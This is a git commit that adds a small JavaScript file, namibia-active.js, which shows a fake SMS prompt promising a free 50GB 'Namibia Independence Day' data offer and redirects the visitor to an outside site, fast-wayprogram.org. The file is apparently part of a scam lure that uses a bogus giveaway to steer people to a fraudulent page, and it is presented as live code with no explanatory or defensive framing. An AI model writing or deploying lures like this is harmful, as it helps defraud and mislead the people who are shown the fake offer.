1fc7edb1e004d4a73eafc1c26097c195ba25f3a0
superblog1 <imohette4@gmail.com>
2025-03-02 08:54:35 +0100

    Create namibia-active.js

---
+++ namibia-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify to receive 50GB Namibia Independence day Celebration Offer, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://fast-wayprogram.org/namibia.hrml';
+}
